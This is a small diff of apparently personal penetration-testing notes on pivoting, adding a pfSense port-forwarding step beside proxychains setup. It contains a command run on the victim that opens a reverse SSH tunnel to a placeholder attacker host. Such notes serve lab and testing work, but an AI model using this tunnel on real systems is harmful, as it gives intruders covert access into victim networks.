@@ -14,5 +14,7 @@ Open /etc/proxychains4.conf.
 
 (ATTACKER) sudo systemctl start ssh.service (check if started)
 
+configure Port Fowarding rule pn pfsense
+
 (VICTIM) ssh -N -f -R 127.0.0.1:9080 attacker_username@attacker_IP -p unique_pivot_port *
 (refrence wiki for screenshots)
